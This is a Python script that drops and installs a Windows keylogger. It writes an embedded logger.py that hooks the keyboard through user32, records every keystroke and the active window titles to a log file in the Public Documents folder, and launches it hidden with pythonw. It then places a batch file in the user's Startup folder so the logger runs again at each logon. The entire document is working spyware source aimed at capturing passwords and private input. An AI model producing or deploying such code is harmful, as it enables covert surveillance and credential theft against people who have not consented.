import os

dir_path = r'C:\Users\Public\Documents'
file_path = os.path.join(dir_path, "logger.py")

file_contents = 'from ctypes import *\nfrom ctypes import wintypes\nimport datetime\nimport sys\nstdout_backup=sys.stdout\nlog_file_path=r"C:\\Users\\Public\\Documents\\log.txt"\nlog_file=open(log_file_path,"a")\nsys.stdout=log_file\nuser32=windll.user32\nLRESULT=c_long\nWH_KEYBOARD_LL=13\nWM_KEYDOWN=0x0100\nWM_RETURN=0x0D\nWM_SHIFT=0x10\nGetWindowTextLengthA=user32.GetWindowTextLengthA\nGetWindowTextLengthA.argtypes=(wintypes.HANDLE,)\nGetWindowTextLengthA.restype=wintypes.INT\nGetWindowTextA=user32.GetWindowTextA\nGetWindowTextA.argtypes=(wintypes.HANDLE,wintypes.LPSTR,wintypes.INT)\nGetWindowTextA.restype=wintypes.INT\nGetKeyState=user32.GetKeyState\nGetKeyState.argtypes=(wintypes.INT,)\nGetKeyState.restype=wintypes.SHORT\nkeyboard_state=wintypes.BYTE*256\nGetKeyboardState=user32.GetKeyboardState\nGetKeyboardState.argtypes=(POINTER(keyboard_state),)\nGetKeyboardState.restype=wintypes.BOOL\nToAscii=user23=user32.ToAscii\nToAscii.argtypes=(wintypes.UINT,wintypes.UINT,POINTER(keyboard_state),wintypes.LPWORD,wintypes.UINT)\nToAscii.restype=wintypes.INT\nCallNextHookEx=user32.CallNextHookEx\nCallNextHookEx.argtypes=(wintypes.HHOOK,wintypes.INT,wintypes.WPARAM,wintypes.LPARAM)\nCallNextHookEx.restype=LRESULT\nHOOKPROC=CFUNCTYPE(LRESULT,wintypes.INT,wintypes.WPARAM,wintypes.LPARAM)\nSetWindowsHookExA=user32.SetWindowsHookExA\nSetWindowsHookExA.argtypes=(wintypes.INT,HOOKPROC,wintypes.HINSTANCE,wintypes.DWORD)\nSetWindowsHookExA.restype=wintypes.HHOOK\nGetMessageA=user32.GetMessageA\nGetMessageA.argtypes=(wintypes.LPMSG,wintypes.HWND,wintypes.UINT,wintypes.UINT)\nGetMessageA.restype=wintypes.BOOL\nclass KBDLLHOOKSTRUCTS(Structure):\n\t_fields_=[("vkCode",wintypes.DWORD),\n\t\t\t\t("scanCode",wintypes.DWORD),\n\t\t\t\t("flag",wintypes.DWORD),\n\t\t\t\t("time",wintypes.DWORD),\n\t\t\t\t("dwExtraInfo",wintypes.DWORD)]\ndef get_foreground_process():\n\thwnd=user32.GetForegroundWindow()\n\tlength=GetWindowTextLengthA(hwnd)\n\tbuff=create_string_buffer(length+1)\n\tGetWindowTextA(hwnd,buff,length+1)\n\treturn buff.value\ndef hook_function(nCode,wParam,lParam):\n\tglobal last\n\tif last!=get_foreground_process():\n\t\tlast=get_foreground_process()\n\t\tcurrent_time=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")\n\t\tprint("\\n[{}]({})".format(last.decode("latin-1"),current_time))\n\tif wParam==WM_KEYDOWN:\n\t\tkeyboard=KBDLLHOOKSTRUCTS.from_address(lParam)\n\t\tstate=(wintypes.BYTE*256)()\n\t\tGetKeyState(WM_SHIFT)\n\t\tGetKeyboardState(byref(state))\n\t\tbuf=(c_ushort*1)()\n\t\tn=ToAscii(keyboard.vkCode,keyboard.scanCode,state,buf,0)\n\t\tif n>0:\n\t\t\tif keyboard.vkCode==WM_RETURN:\n\t\t\t\tprint()\n\t\t\telse:\n\t\t\t\tprint(string_at(buf).decode("latin-1"),end="",flush=True)\n\treturn CallNextHookEx(hook,nCode,wParam,lParam)\nlast=None\ncallback=HOOKPROC(hook_function)\nhook=SetWindowsHookExA(WH_KEYBOARD_LL,callback,0,0)\nGetMessageA(byref(wintypes.MSG()),0,0,0)\nsys.stdout=stdout_backup\nlog_file.close()'

os.system(r'start /B pythonw "C:\Users\Public\Documents\logger.py"')

with open(file_path, "w") as f:
    f.write(file_contents)
    f.close()


dir_path = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(os.environ.get('USERNAME'))
file_path = os.path.join(dir_path, "logger-startup.bat")

file_contents = '@echo off\nstart /B pythonw "C:\\Users\\Public\\Documents\\logger.py"'

with open(file_path, "w") as f:
    f.write(file_contents)
    f.close()